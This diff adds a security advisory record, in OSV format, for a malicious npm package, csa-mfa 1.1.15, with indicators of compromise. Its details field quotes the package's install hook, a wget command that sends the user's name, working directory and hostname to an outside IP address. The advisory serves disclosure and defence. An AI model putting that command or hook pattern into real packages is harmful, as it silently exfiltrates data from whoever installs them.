@@ -1,0 +1,64 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-12149",
+  "modified": "2026-09-15T10:30:48Z",
+  "published": "2026-09-15T10:28:50Z",
+  "summary": "Malicious code in csa-mfa (npm)",
+  "details": "The package ships no code — only a package.json whose preinstall, preupdate, and test lifecycle hooks each run `wget --quiet \"hxxp://169[.]58[.]142[.]14:8080/?user=$(whoami)\u0026path=$(pwd)\u0026hostname=$(hostname)\"`. On install, the hook exfiltrates the installing user's username, current working directory, and hostname to the hardcoded host 169[.]58[.]142[.]14:8080.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "csa-mfa",
+        "purl": "pkg:npm/csa-mfa"
+      },
+      "versions": [
+        "1.1.15"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/csa-mfa/v/1.1.15"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-12149"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-09-15T10:28:50Z",
+      "indicators_observed": {
+        "ip_observed": [
+          "169[.]58[.]142[.]14:8080"
+        ],
+        "sha256": [
+          "d6fa455732a0472e2c655dfcdf31e10956d0f0b5e0f82653522ea45fe6ab8d15"
+        ],
+        "url_observed": [
+          "hxxp://169[.]58[.]142[.]14"
+        ]
+      }
+    }
+  }
+}
